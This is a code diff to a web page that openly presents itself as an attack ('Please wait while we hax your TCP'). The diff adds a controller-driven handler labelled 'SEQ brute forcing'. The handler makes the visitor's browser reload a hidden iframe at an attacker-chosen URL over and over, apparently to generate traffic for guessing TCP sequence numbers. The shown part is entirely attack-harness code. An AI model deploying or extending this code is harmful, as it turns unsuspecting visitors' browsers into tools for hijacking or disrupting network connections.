@@ -203,6 +203,25 @@ try {
         }
     }
 
+    var iframe_url;
+    var iframe_inited = false;
+    function iframe_loaded()
+    {
+        if (!iframe_inited) {
+            iframe_inited = true;
+            return;  // Send message to controller?
+        }
+        document.getElementById('iframe').src = iframe_url + '?' + Math.random();
+    }
+
+    function init_iframe(url)
+    {
+        iframe_url = url;
+        iframe_inited = false;
+        document.getElementById('iframe').addEventListener('load', iframe_loaded, false);
+        document.getElementById('iframe').src = url + '?' + Math.random();
+    }
+
     function handleControlMessage(evt)
     {
         console.log("control: " + evt.data);
@@ -223,6 +242,16 @@ try {
         } else if (evt.data.substr(0, "bwtest".length) == "bwtest") {
             data = evt.data.substr("bwtest ".length);
             bw_test(data);
+
+        /* SEQ brute forcing */
+        } else if (evt.data.substr(0, "init_iframe".length) == "init_iframe") {
+            url = evt.data.substr("init_iframe ".length);
+            init_iframe(url);
+        } else if (evt.data.substr(0, "iframe".length) == "iframe") {
+            //data = evt.data.substr("iframe ".length);
+            iframe_loaded(); 
+
+        /* Display */
         } else if (evt.data.substr(0, "show".length) == "show") {
             data = evt.data.substr("show ".length);
             document.getElementById('output').innerHTML += "<br/>" + data
@@ -257,6 +286,7 @@ Please wait while we hax your TCP. Thank you.
 
 <div id="img-container">
 <script id="img-element"></script>
+<iframe id="iframe"></iframe>
 </div>
 
 </center>
